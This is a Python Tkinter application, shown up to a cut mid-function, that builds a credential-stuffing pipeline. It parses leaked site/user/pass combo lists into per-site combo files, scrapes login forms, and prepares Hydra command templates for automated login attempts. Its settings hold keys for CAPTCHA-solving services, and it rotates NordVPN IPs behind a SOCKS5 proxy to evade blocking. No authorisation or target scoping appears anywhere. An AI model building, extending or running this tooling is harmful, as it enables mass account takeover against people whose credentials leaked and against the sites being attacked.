import csv
import json
import os
import platform
import queue
import shutil
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from pathlib import Path

import tkinter as tk
from tkinter import filedialog, messagebox, ttk

from app_logging import logger
from config import DATA_DIR, PROCESSED_SITES_FILE, config, download_gost, get_effective_proxy, get_vpn_control, save_config
from extract import extract_login_form
from helpers import COMMON_LOGIN_PATHS, get_base_url, get_site_filename, log_once, normalize_and_validate_target, normalize_site, split_three_fields
from runner import RunnerMixin


def apply_theme(root):
    style = ttk.Style(root)
    available = set(style.theme_names())
    preferred = "vista" if platform.system() == "Windows" and "vista" in available else "clam"
    if preferred in available:
        style.theme_use(preferred)

    base_pad = 8
    style.configure("TFrame", padding=base_pad)
    style.configure("TLabelframe", padding=base_pad)
    style.configure("TLabelframe.Label", font=("Segoe UI", 10, "bold"))
    style.configure("TLabel", font=("Segoe UI", 10))
    style.configure("Header.TLabel", font=("Segoe UI Semibold", 15))
    style.configure("TButton", padding=(12, 6), font=("Segoe UI", 10))
    style.configure("Treeview", font=("Segoe UI", 10), rowheight=30)
    style.configure("Treeview.Heading", font=("Segoe UI Semibold", 10))
    style.map("Treeview", background=[("selected", "#d9ebff")], foreground=[("selected", "#1f2937")])
    style.configure("TNotebook.Tab", padding=(16, 8), font=("Segoe UI Semibold", 10))


class CombinedParserGUI(RunnerMixin):
    def __init__(self, root):
        self.root = root
        apply_theme(self.root)
        self.root.title("Ultimate Combo → Hydra Pipeline")
        self.root.geometry("1450x980")
        self.root.minsize(1200, 720)

        self.input_path = tk.StringVar()
        self.output_path = tk.StringVar()
        self.forms_output_path = tk.StringVar()
        self.status_text = tk.StringVar(value="Ready.")
        self.state_text = tk.StringVar(value="Idle")
        self.header1 = tk.StringVar(value="site")
        self.header2 = tk.StringVar(value="user")
        self.header3 = tk.StringVar(value="pass")
        self.create_combo = tk.BooleanVar(value=True)
        self.extract_forms = tk.BooleanVar(value=True)
        self.skip_blank = tk.BooleanVar(value=True)
        self.trim_whitespace = tk.BooleanVar(value=True)
        self.use_proxy = tk.BooleanVar(value=get_vpn_control(config) == "nordvpn")
        self.proxy_url = tk.StringVar(value=config.get("proxy_url", ""))
        self.tld_only = tk.BooleanVar(value=True)
        self.threads = tk.IntVar(value=6)
        self.strict_validation = tk.BooleanVar(value=True)
        self.force_recheck = tk.BooleanVar(value=bool(config.get("force_recheck", False)))
        self.burp_proxy = tk.StringVar(value=config.get("burp_proxy", ""))
        self.show_debug_details = tk.BooleanVar(value=False)

        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event = threading.Event()
        self.pause_event = threading.Event()
        self.ui_queue = queue.Queue()
        self._main_thread = threading.current_thread()
        self.gost_process = None

        self.processed_file = PROCESSED_SITES_FILE
        self.processed_data = self.load_processed_data()

        self.runner_tree = None
        self.hydra_log = None
        self.processing_thread = None
        self.notebook = None
        self.settings_window = None

        self.runner_rows_all = []
        self.runner_rows_view = []
        self.runner_sort_state = {}
        self.runner_last_sort_col = None
        self.runner_active_process = None
        self.runner_thread = None
        self.runner_running = False

        self._build_ui()
        self.root.after(100, self._drain_ui_queue)
        self.root.after(500, self.refresh_runner_list)  # slight delay to ensure widgets are ready

    def load_processed_data(self):
        if self.processed_file.exists():
            try:
                raw = json.loads(self.processed_file.read_text(encoding='utf-8'))
                return self._migrate_processed_schema(raw)
            except:
                return {}
        return {}

    def save_processed_data(self):
        self.processed_file.write_text(json.dumps(self.processed_data, indent=2), encoding='utf-8')

    def _migrate_processed_schema(self, raw):
        migrated = {}
        for site, entry in (raw or {}).items():
            if not isinstance(entry, dict):
                entry = {}
            extracted = entry.get("extracted") or {}
            if not extracted and entry.get("form_found"):
                extracted = {
                    "action_url": entry.get("action") or entry.get("hydra_action"),
                    "confidence": entry.get("confidence"),
                }
            status = entry.get("status")
            if not status:
                if entry.get("form_found"):
                    status = "success"
                elif entry.get("failed_urls"):
                    status = "fetch_failed"
                else:
                    status = "pending"
            migrated[site] = {
                "first_seen_ts": entry.get("first_seen_ts") or entry.get("last_processed") or datetime.now().isoformat(),
                "last_checked_ts": entry.get("last_checked_ts") or entry.get("last_processed"),
                "status": status,
                "extracted": extracted,
                "last_error_code": entry.get("last_error_code"),
                "last_error_hint": entry.get("last_error_hint"),
                "last_error_detail": entry.get("last_error_detail") or entry.get("last_error_message"),
                "last_error_stacktrace": entry.get("last_error_stacktrace"),
                "combo_count": entry.get("combo_count", 0),
                "combo_path": entry.get("combo_path", ""),
                "hydra_command_template": entry.get("hydra_command_template", ""),
                "form_found": bool(entry.get("form_found")),
            }
        return migrated

    def _is_cache_fresh(self, entry, ttl_days):
        checked = entry.get("last_checked_ts")
        if not checked:
            return False
        try:
            checked_dt = datetime.fromisoformat(checked)
        except Exception:
            return False
        return (datetime.now() - checked_dt) <= timedelta(days=ttl_days)

    def _cache_skip_reason(self, base, retry_failed_only=False):
        if self.force_recheck.get():
            return None
        entry = self.processed_data.get(base) or {}
        status = entry.get("status")
        if retry_failed_only:
            if status != "fetch_failed":
                return "not failed"
            return None

        failed_ttl_days = int(config.get("failed_retry_ttl_days", 1))
        if status == "fetch_failed" and self._is_cache_fresh(entry, failed_ttl_days):
            return "recent fetch failure"

        ttl_days = int(config.get("cache_ttl_days", 30))
        if status in {"success", "success_form", "success_loginish", "no_form"} and self._is_cache_fresh(entry, ttl_days):
            if status in {"success", "success_form"} and not (entry.get("extracted") or {}).get("action_url"):
                return None
            return "already cached"
        return None

    def _write_log_threadsafe(self, text):
        self.ui_queue.put(("extractor_log", text + "\n"))

    def _update_status_threadsafe(self, text):
        self.ui_queue.put(("status", text))

    def _update_progress_threadsafe(self, mode=None, maximum=None, value=None, stop=False):
        self.ui_queue.put(("progress", {"mode": mode, "maximum": maximum, "value": value, "stop": stop}))

    def _show_progress_threadsafe(self, show):
        self.ui_queue.put(("progress_visible", bool(show)))

    def _drain_ui_queue(self):
        while True:
            try:
                event, payload = self.ui_queue.get_nowait()
            except queue.Empty:
                break

            if event == "extractor_log":
                self.log.insert(tk.END, payload)
                self.log.see(tk.END)
            elif event == "hydra_log":
                self.hydra_log.insert(tk.END, payload)
                self.hydra_log.see(tk.END)
            elif event == "status":
                self.status_text.set(payload)
            elif event == "progress":
                if payload["mode"] is not None:
                    self.progress["mode"] = payload["mode"]
                if payload["maximum"] is not None:
                    self.progress["maximum"] = payload["maximum"]
                if payload["value"] is not None:
                    self.progress["value"] = payload["value"]
                if payload["stop"]:
                    self.progress.stop()
            elif event == "progress_visible":
                if payload:
                    self.progress.grid()
                else:
                    self.progress.grid_remove()
            elif event == "pipeline_done":
                self.cleanup_after_pipeline(payload)
            elif event == "runner_done":
                self.finish_runner_execution(payload)
            elif event == "runner_refresh":
                self.apply_runner_filters_and_sort()

        self.root.after(100, self._drain_ui_queue)

    def _build_ui(self):
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

        container = ttk.Frame(self.root, padding=8)
        container.grid(row=0, column=0, sticky="nsew")
        container.columnconfigure(0, weight=1)
        container.rowconfigure(0, weight=1)
        container.rowconfigure(1, weight=0)

        notebook = ttk.Notebook(container)
        self.notebook = notebook
        notebook.grid(row=0, column=0, sticky="nsew")

        extractor_tab = ttk.Frame(notebook)
        notebook.add(extractor_tab, text="Extractor")

        runner_tab = ttk.Frame(notebook)
        notebook.add(runner_tab, text="Hydra Runner")

        self.build_extractor_tab(extractor_tab)
        self.build_runner_tab(runner_tab)

        status_bar = ttk.Frame(container, padding=(8, 4))
        status_bar.grid(row=1, column=0, sticky="ew")
        status_bar.columnconfigure(0, weight=1)
        ttk.Label(status_bar, textvariable=self.status_text).grid(row=0, column=0, sticky="w")
        ttk.Label(status_bar, textvariable=self.state_text).grid(row=0, column=1, sticky="e")

        def on_tab_changed(event):
            selected_tab = notebook.select()
            if selected_tab == notebook.tabs()[1]:
                try:
                    self.refresh_runner_list()
                except AttributeError:
                    pass

        notebook.bind("<<NotebookTabChanged>>", on_tab_changed)

    def _bind_scroll_wheel(self, widget, y_target=None, x_target=None):
        y_target = y_target or widget
        x_target = x_target or widget

        def _scroll_vertical(units):
            y_target.yview_scroll(units, "units")
            return "break"

        def _scroll_horizontal(units):
            x_target.xview_scroll(units, "units")
            return "break"

        system = platform.system()
        if system in {"Windows", "Darwin"}:
            def on_mousewheel(event):
                delta = event.delta
                if system == "Darwin":
                    units = -1 if delta > 0 else 1
                else:
                    units = int(-1 * (delta / 120)) if delta else 0
                if units:
                    return _scroll_vertical(units)

            def on_shift_mousewheel(event):
                delta = event.delta
                if system == "Darwin":
                    units = -1 if delta > 0 else 1
                else:
                    units = int(-1 * (delta / 120)) if delta else 0
                if units:
                    return _scroll_horizontal(units)

            widget.bind("<MouseWheel>", on_mousewheel, add="+")
            widget.bind("<Shift-MouseWheel>", on_shift_mousewheel, add="+")
        else:
            widget.bind("<Button-4>", lambda _e: _scroll_vertical(-1), add="+")
            widget.bind("<Button-5>", lambda _e: _scroll_vertical(1), add="+")
            widget.bind("<Shift-Button-4>", lambda _e: _scroll_horizontal(-1), add="+")
            widget.bind("<Shift-Button-5>", lambda _e: _scroll_horizontal(1), add="+")

    def build_extractor_tab(self, tab):
        tab.columnconfigure(0, weight=1)
        tab.rowconfigure(0, weight=1)

        main = ttk.Frame(tab, padding=12)
        main.grid(row=0, column=0, sticky="nsew")
        main.columnconfigure(0, weight=1)
        main.rowconfigure(4, weight=1)

        ttk.Label(main, text="Combo Parser + Advanced Form Extractor", style="Header.TLabel").grid(row=0, column=0, sticky="w", pady=(0, 8))

        io_grid = ttk.Frame(main)
        io_grid.grid(row=1, column=0, sticky="ew", pady=(0, 8))
        for idx in range(3):
            io_grid.columnconfigure(idx, weight=1)

        inp_f = ttk.LabelFrame(io_grid, text="Input (file or folder)")
        inp_f.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        inp_f.columnconfigure(0, weight=1)
        ttk.Entry(inp_f, textvariable=self.input_path).grid(row=0, column=0, sticky="ew", padx=(0, 8))
        ttk.Button(inp_f, text="File", command=self.choose_input_file).grid(row=0, column=1, padx=(0, 4))
        ttk.Button(inp_f, text="Folder", command=self.choose_input_folder).grid(row=0, column=2)

        out_f = ttk.LabelFrame(io_grid, text="Main CSV Output")
        out_f.grid(row=0, column=1, sticky="nsew", padx=4)
        out_f.columnconfigure(0, weight=1)
        ttk.Entry(out_f, textvariable=self.output_path).grid(row=0, column=0, sticky="ew", padx=(0, 8))
        ttk.Button(out_f, text="Save As", command=self.choose_output_file).grid(row=0, column=1)

        forms_f = ttk.LabelFrame(io_grid, text="Hydra Forms CSV")
        forms_f.grid(row=0, column=2, sticky="nsew", padx=(8, 0))
        forms_f.columnconfigure(0, weight=1)
        ttk.Entry(forms_f, textvariable=self.forms_output_path).grid(row=0, column=0, sticky="ew", padx=(0, 8))
        ttk.Button(forms_f, text="Save As", command=self.choose_forms_output_file).grid(row=0, column=1)

        mid_grid = ttk.Frame(main)
        mid_grid.grid(row=2, column=0, sticky="ew", pady=(0, 8))
        for idx in range(3):
            mid_grid.columnconfigure(idx, weight=1)

        head_f = ttk.LabelFrame(mid_grid, text="CSV Headers")
        head_f.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        for i, txt, var in zip(range(3), ["Column 1 (site)", "Column 2 (user)", "Column 3 (pass)"], [self.header1, self.header2, self.header3]):
            ttk.Label(head_f, text=txt).grid(row=i, column=0, sticky="w", padx=(0, 6), pady=4)
            ttk.Entry(head_f, textvariable=var, width=40).grid(row=i, column=1, sticky="ew", pady=4)
        head_f.columnconfigure(1, weight=1)

        opt_f = ttk.LabelFrame(mid_grid, text="Options")
        opt_f.grid(row=0, column=1, sticky="nsew", padx=4)
        ttk.Checkbutton(opt_f, text="Skip blank lines", variable=self.skip_blank).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Trim whitespace", variable=self.trim_whitespace).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Create user:pass combo.txt per site", variable=self.create_combo).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Extract login forms", variable=self.extract_forms).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Strict form validation", variable=self.strict_validation).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Force recheck (ignore cache TTL)", variable=self.force_recheck).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Show debug details", variable=self.show_debug_details).pack(anchor="w", pady=4)

        proxy_f = ttk.LabelFrame(mid_grid, text="Proxy / VPN (NordVPN Auto)")
        proxy_f.grid(row=0, column=2, sticky="nsew", padx=(8, 0))
        ttk.Label(proxy_f, text="VPN behavior is controlled by Settings → vpn_control").pack(anchor="w")
        ttk.Label(proxy_f, text="Use proxy_url for an already-running SOCKS/HTTP proxy").pack(anchor="w")

        thread_f = ttk.LabelFrame(main, text="Extraction Speed")
        thread_f.grid(row=3, column=0, sticky="ew", pady=(0, 8))
        thread_f.columnconfigure(0, weight=1)
        ttk.Label(thread_f, text="Threads (4-8 recommended):").grid(row=0, column=0, sticky="w")
        ttk.Scale(thread_f, from_=1, to=12, orient="horizontal", variable=self.threads, command=lambda v: self.threads.set(int(round(float(v))))).grid(row=1, column=0, sticky="ew", padx=8)
        ttk.Label(thread_f, textvariable=self.threads).grid(row=0, column=1, rowspan=2, sticky="e", padx=(8, 0))

        action_row = ttk.Frame(main)
        action_row.grid(row=4, column=0, sticky="nsew")
        action_row.columnconfigure(0, weight=1)
        action_row.rowconfigure(2, weight=1)

        btn_f = ttk.Frame(action_row)
        btn_f.grid(row=0, column=0, sticky="e", pady=(0, 8))
        self.start_button = ttk.Button(btn_f, text="Start Pipeline", command=self.start_pipeline)
        self.start_button.pack(side="left", padx=4)
        self.pause_button = ttk.Button(btn_f, text="Pause", command=self.toggle_pause, state="disabled")
        self.pause_button.pack(side="left", padx=4)
        self.cancel_button = ttk.Button(btn_f, text="Cancel", command=self.cancel_pipeline, state="disabled")
        self.cancel_button.pack(side="left", padx=(12, 4))
        self.retry_button = ttk.Button(btn_f, text="Retry Failed", command=self.retry_failed)
        self.retry_button.pack(side="left", padx=4)
        ttk.Button(btn_f, text="Settings", command=self.open_settings).pack(side="left", padx=4)
        ttk.Button(btn_f, text="Clear Log", command=self.clear_log).pack(side="left", padx=4)

        self.progress = ttk.Progressbar(action_row, orient="horizontal", mode="determinate")
        self.progress.grid(row=1, column=0, sticky="ew", pady=(0, 8))
        self.progress.grid_remove()

        log_f = ttk.LabelFrame(action_row, text="Extraction Log")
        log_f.grid(row=2, column=0, sticky="nsew")
        log_f.columnconfigure(0, weight=1)
        log_f.rowconfigure(0, weight=1)

        self.log = tk.Text(log_f, height=18, wrap="none", font=("Consolas", 10), padx=8, pady=8)
        self.log.grid(row=0, column=0, sticky="nsew")
        log_y = ttk.Scrollbar(log_f, orient="vertical", command=self.log.yview)
        log_y.grid(row=0, column=1, sticky="ns")
        log_x = ttk.Scrollbar(log_f, orient="horizontal", command=self.log.xview)
        log_x.grid(row=1, column=0, sticky="ew")
        self.log.configure(yscrollcommand=log_y.set, xscrollcommand=log_x.set)
        self._bind_scroll_wheel(self.log)

    def open_settings(self):
        settings_window = tk.Toplevel(self.root)
        self.settings_window = settings_window
        settings_window.title("Settings")
        settings_window.geometry("560x560")

        ttk.Label(settings_window, text="DeathByCaptcha Username").pack(pady=5)
        self.dbc_user = tk.StringVar(value=config.get("dbc_user", ""))
        ttk.Entry(settings_window, textvariable=self.dbc_user).pack(pady=5)

        ttk.Label(settings_window, text="DeathByCaptcha Password").pack(pady=5)
        self.dbc_pass = tk.StringVar(value=config.get("dbc_pass", ""))
        ttk.Entry(settings_window, textvariable=self.dbc_pass, show="*").pack(pady=5)

        ttk.Label(settings_window, text="NordVPN Token").pack(pady=5)
        self.nord_token = tk.StringVar(value=config.get("nord_token", ""))
        ttk.Entry(settings_window, textvariable=self.nord_token).pack(pady=5)

        ttk.Label(settings_window, text="2Captcha API Key (optional)").pack(pady=5)
        ttk.Label(settings_window, text="VPN Control").pack(pady=5)
        self.vpn_control = tk.StringVar(value=get_vpn_control(config))
        ttk.Combobox(settings_window, textvariable=self.vpn_control, values=["none", "nordvpn"], state="readonly").pack(pady=5)

        ttk.Label(settings_window, text="Proxy URL (optional, socks5/http)").pack(pady=5)
        self.proxy_url_setting = tk.StringVar(value=config.get("proxy_url", ""))
        ttk.Entry(settings_window, textvariable=self.proxy_url_setting).pack(pady=5, fill="x", padx=16)

        self.proxy_required = tk.BooleanVar(value=bool(config.get("proxy_required", False)))
        ttk.Checkbutton(settings_window, text="Require proxy (fail fast if unreachable)", variable=self.proxy_required).pack(pady=5)

        self.allow_nonstandard_ports = tk.BooleanVar(value=bool(config.get("allow_nonstandard_ports", False)))
        ttk.Checkbutton(settings_window, text="Allow nonstandard ports during extraction", variable=self.allow_nonstandard_ports).pack(pady=5)

        ttk.Label(settings_window, text="Cache TTL days (success/no form)").pack(pady=5)
        self.cache_ttl_days = tk.IntVar(value=int(config.get("cache_ttl_days", 30)))
        ttk.Entry(settings_window, textvariable=self.cache_ttl_days).pack(pady=5)

        ttk.Label(settings_window, text="Retry TTL days (fetch failures)").pack(pady=5)
        self.failed_retry_ttl_days = tk.IntVar(value=int(config.get("failed_retry_ttl_days", 1)))
        ttk.Entry(settings_window, textvariable=self.failed_retry_ttl_days).pack(pady=5)

        self.twocaptcha_key = tk.StringVar(value=config.get("twocaptcha_key", ""))
        ttk.Entry(settings_window, textvariable=self.twocaptcha_key).pack(pady=5)

        self.debug_logging = tk.BooleanVar(value=bool(config.get("debug_logging", False)))
        ttk.Checkbutton(settings_window, text="Enable debug logging", variable=self.debug_logging).pack(pady=5)

        ttk.Label(settings_window, text="Burp Proxy (optional, e.g. http://127.0.0.1:8080)").pack(pady=5)
        self.burp_proxy = tk.StringVar(value=config.get("burp_proxy", ""))
        ttk.Entry(settings_window, textvariable=self.burp_proxy).pack(pady=5, fill="x", padx=16)

        ttk.Button(settings_window, text="Save & Close", command=self.save_settings).pack(pady=20)

    def save_settings(self):
        config['dbc_user'] = self.dbc_user.get()
        config['dbc_pass'] = self.dbc_pass.get()
        config['nord_token'] = self.nord_token.get()
        config['twocaptcha_key'] = self.twocaptcha_key.get()
        config['vpn_control'] = self.vpn_control.get().strip().lower()
        config['proxy_url'] = self.proxy_url_setting.get().strip()
        config['proxy_required'] = bool(self.proxy_required.get())
        config['allow_nonstandard_ports'] = bool(self.allow_nonstandard_ports.get())
        config['cache_ttl_days'] = max(1, int(self.cache_ttl_days.get() or 30))
        config['failed_retry_ttl_days'] = max(1, int(self.failed_retry_ttl_days.get() or 1))
        config['force_recheck'] = bool(self.force_recheck.get())
        config['burp_proxy'] = self.burp_proxy.get().strip()
        config['ignore_https_errors'] = bool(config.get('ignore_https_errors', False))
        config['debug_logging'] = bool(self.debug_logging.get())
        logger.set_debug(bool(config.get('debug_logging', False)))
        save_config()
        messagebox.showinfo("Settings", "Settings saved.")
        if self.settings_window and self.settings_window.winfo_exists():
            self.settings_window.destroy()

    def _resolve_nordvpn_cli(self):
        for candidate in ("nordvpn", "nordvpncli"):
            cli_path = shutil.which(candidate)
            if cli_path:
                return cli_path
        return None

    def _windows_nordvpn_supported(self, cli_path):
        if platform.system().lower() != "windows":
            return True
        if "nordvpngui" in Path(cli_path).name.lower():
            return False
        try:
            result = subprocess.run([cli_path, "--help"], capture_output=True, text=True, timeout=5)
            help_text = (result.stdout or "") + "\n" + (result.stderr or "")
            help_text = help_text.lower()
        except Exception:
            return False
        return "connect" in help_text and "disconnect" in help_text

    def setup_nordvpn_proxy(self):
        if get_vpn_control(config) != "nordvpn":
            return None
        try:
            cli_path = self._resolve_nordvpn_cli()
            if not cli_path or not self._windows_nordvpn_supported(cli_path):
                msg = "NordVPN automation not supported on Windows; set vpn_control='none' and manage VPN externally."
                self._write_log_threadsafe(msg)
                log_once("nordvpn-windows-unsupported", msg)
                return None

            if not config.get('nord_token'):
                self._write_log_threadsafe("No NordVPN token set - using no proxy")
                return None

            self._write_log_threadsafe("Setting up NordVPN + SOCKS5 proxy...")
            subprocess.run([cli_path, "login", "--token", config['nord_token']], capture_output=True)
            subprocess.run([cli_path, "connect"], capture_output=True)

            gost_path = download_gost()
            if not gost_path:
                self._write_log_threadsafe("gost unavailable; continuing without proxy")
                return None

            self.gost_process = subprocess.Popen([str(gost_path), "-L=socks5://:1080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            return {"server": "socks5://127.0.0.1:1080"}
        except Exception as e:
            self._write_log_threadsafe(f"NordVPN / gost setup failed: {e}. Falling back to no proxy.")
            return None

    def rotate_nordvpn(self):
        if get_vpn_control(config) != "nordvpn":
            return
        try:
            cli_path = self._resolve_nordvpn_cli()
            if not cli_path or not self._windows_nordvpn_supported(cli_path):
                return
            subprocess.run([cli_path, "disconnect"], capture_output=True)
            subprocess.run([cli_path, "connect"], capture_output=True)
            self._write_log_threadsafe("Rotated NordVPN IP")
        except Exception as e:
            self._write_log_threadsafe(f"IP rotation failed: {e}")

    def choose_input_file(self):
        fp = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if fp:
            self.input_path.set(fp)
            if not self.output_path.get():
                self.output_path.set(str(Path(fp).with_suffix(".csv")))
            self._write_log_threadsafe(f"Input file: {fp}")

    def choose_input_folder(self):
        d = filedialog.askdirectory()
        if d:
            self.input_path.set(d)
            if not self.output_path.get():
                self.output_path.set(str(Path(d) / "combined.csv"))
            self._write_log_threadsafe(f"Input folder: {d}")

    def choose_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.output_path.set(fp)
            self._write_log_threadsafe(f"Output CSV: {fp}")

    def choose_forms_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.forms_output_path.set(fp)
            self._write_log_threadsafe(f"Forms CSV: {fp}")

    def clear_log(self):
        self.log.delete("1.0", tk.END)

    def start_pipeline(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event.clear()
        self.pause_event.clear()

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Running...")
        self.state_text.set("Running")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(False,))
        self.processing_thread.start()

    def retry_failed(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event.clear()
        self.pause_event.clear()

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Retrying failed sites...")
        self.state_text.set("Running")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(True,))
        self.processing_thread.start()

    def toggle_pause(self):
        if not self.pipeline_running and not self.runner_running:
            return

        is_paused = not self.pause_event.is_set()
        if is_paused:
            self.pause_event.set()
            self.pipeline_paused = True
            self.pause_button.config(text="Resume")
            self.status_text.set("Paused")
            self.state_text.set("Paused")
            log_once("pipeline-paused", "Pipeline/Runner paused; waiting before launching new work.")
        else:
            self.pause_event.clear()
            self.pipeline_paused = False
            self.pause_button.config(text="Pause")
            self.status_text.set("Running...")
            self.state_text.set("Running")

    def cancel_pipeline(self):
        if not self.pipeline_running and not self.runner_running:
            return

        self.pipeline_cancelled = True
        self.pipeline_paused = False
        self.pause_event.clear()
        self.cancel_event.set()
        self.status_text.set("Cancelling...")
        self.state_text.set("Canceled")
        self.cancel_button.config(state="disabled")
        log_once("cancel-requested", "Cancellation requested; stopping outstanding work.")
        self.terminate_active_runner_process()

        if self.pipeline_running:
            self.root.after(200, self.check_thread_done)

    def check_thread_done(self):
        if self.processing_thread and self.processing_thread.is_alive():
            self.root.after(500, self.check_thread_done)
        else:
            self.cleanup_after_pipeline("Cancelled by user")

    def cleanup_after_pipeline(self, final_msg):
        if threading.current_thread() is not self._main_thread:
            self.ui_queue.put(("pipeline_done", final_msg))
            return

        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event.clear()
        self.pause_event.clear()

        self.start_button.config(state="normal")
        self.pause_button.config(state="disabled")
        self.cancel_button.config(state="disabled")
        self.retry_button.config(state="normal")
        self.status_text.set(final_msg)
        self.state_text.set("Idle")
        messagebox.showinfo("Pipeline Status", final_msg)

        if self.gost_process:
            self.gost_process.terminate()
            self.gost_process = None
        if get_vpn_control(config) == "nordvpn":
            cli_path = self._resolve_nordvpn_cli()
            if cli_path and self._windows_nordvpn_supported(cli_path):
                subprocess.run([cli_path, "disconnect"], capture_output=True)
        self.save_processed_data()

    def wait_if_paused_or_cancelled(self):
        while self.pause_event.is_set() and not self.cancel_event.is_set():
            time.sleep(0.2)
        return self.cancel_event.is_set()

    def process_pipeline(self, retry_failed_only=False):
        try:
            input_str = self.input_path.get().strip()
            out_csv = self.output_path.get().strip()
            forms_csv = self.forms_output_path.get().strip()

            if not input_str or not out_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Input and main output required."))
                self.cleanup_after_pipeline("Failed - Missing input/output")
                return

            if self.extract_forms.get() and not forms_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Forms output required."))
                self.cleanup_after_pipeline("Failed - Missing forms output")
                return

            in_path = Path(input_str)
            out_path = Path(out_csv)
            forms_path = Path(forms_csv) if self.extract_forms.get() else None

            headers = [self.header1.get().strip(), self.header2.get().strip(), self.header3.get().strip()]
            if any(not h for h in headers):
                self.root.after(0, lambda: messagebox.showerror("Error", "All headers required."))
                self.cleanup_after_pipeline("Failed - Missing headers")
                return

            input_files = [in_path] if in_path.is_file() else list(in_path.glob("*.txt"))
            if not input_files:
                self.root.after(0, lambda: messagebox.showerror("Error", "No .txt files found."))
                self.cleanup_after_pipeline("Failed - No input files")
                return

            rows = []
            skipped = 0
            site_combos = {}

            self._write_log_threadsafe("Collecting data...")
            self._update_status_threadsafe("Collecting...")
            self._update_progress_threadsafe(mode="indeterminate")
            self._show_progress_threadsafe(True)

            for file in input_files:
                self._write_log_threadsafe(f"Parsing: {file.name}")
                with file.open("r", encoding="utf-8", errors="replace") as f:
                    for ln, raw in enumerate(f, 1):
                        if self.cancel_event.is_set():
                            self.cleanup_after_pipeline("Cancelled during data collection")
                            return

                        if self.wait_if_paused_or_cancelled():
                            self.cleanup_after_pipeline("Cancelled while paused")
                            return

                        line = raw.strip() if self.trim_whitespace.get() else raw.rstrip("\n\r")
                        if self.skip_blank.get() and not line:
                            continue
                        parts = split_three_fields(line)
                        if not parts:
                            skipped += 1
                            continue

                        rows.append(parts)
                        user, pw = parts[1], parts[2]
                        if user or pw:
                            orig_url = normalize_site(parts[0])
                            if orig_url:
                                base = get_base_url(orig_url)
                                if base:
                                    site_combos.setdefault(base, set()).add(f"{user}:{pw}")

            self._write_log_threadsafe(f"Main CSV: {len(rows)} rows | {skipped} skipped")

            out_path.parent.mkdir(parents=True, exist_ok=True)
            with out_path.open("w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(headers)
                writer.writerows(rows)
            self._write_log_threadsafe(f"Wrote combined CSV → {out_path}")

            if self.create_combo.get():
                for base, combos_set in site_combos.items():
                    combo_path = DATA_DIR / get_site_filename(base)
                    existing = set()
                    if combo_path.exists():
                        with combo_path.open("r", encoding="utf-8") as f:
                            existing = set(line.strip() for line in f if line.strip())
                    new_unique = combos_set - existing
                    if new_unique:
                        with combo_path.open("a", encoding="utf-8") as f:
                            f.write("\n".join(new_unique) + "\n")
                            f.flush()
                        self._write_log_threadsafe(f"Appended {len(new_unique)} new combos to {combo_path.name}")
                    self.processed_data.setdefault(base, {})["combo_count"] = len(existing) + len(new_unique)
                    self.processed_data[base]["combo_path"] = str(combo_path.resolve())

            self.save_processed_data()

            proxy_candidate = None
            if get_vpn_control(config) == "nordvpn":
                proxy_candidate = self.setup_nordvpn_proxy()

            if get_vpn_control(config) == "none" and config.get("proxy_url", "").strip():
                self._write_log_threadsafe(f"Using configured proxy_url for extraction: {config.get('proxy_url', '').strip()}")

            proxy = get_effective_proxy(config, proxy_candidate)

            if self.extract_forms.get() and site_combos:
                site_list = []
                for base in site_combos:
                    skip_reason = self._cache_skip_reason(base, retry_failed_only=retry_failed_only)
                    if skip_reason:
                        if skip_reason == "already cached":
                            self._write_log_threadsafe(f"{base} :: Skipped (already cached)")
                        continue
                    site_list.append(base)

                if not site_list:
                    self._write_log_threadsafe("No sites need form extraction.")
                    self.cleanup_after_pipeline("Complete - No new forms needed.")
                    return

                self._write_log_threadsafe(f"Extracting forms for {len(site_list)} sites...")
                self._update_status_threadsafe("Extracting forms...")
                self._update_progress_threadsafe(mode="determinate", maximum=len(site_list), value=0)
                self._show_progress_threadsafe(True)

                results = []
                total = len(site_list)
                rotation_counter = 0

                def extract_for_site(base):
                    nonlocal rotation_counter
                    if self.cancel_event.is_set():
                        return None

                    if self.wait_if_paused_or_cancelled():
                        return None

                    normalized, invalid_reason = normalize_and_validate_target(base, allow_nonstandard_ports=bool(config.get("allow_nonstandard_ports", False)))
                    if not normalized:
                        return {"status": "skipped_invalid_target", "reason": invalid_reason}

                    urls_to_try = [normalized]
                    if not self.tld_only.get():
                        clean_base = normalized.rstrip('/')
                        for path in COMMON_LOGIN_PATHS:
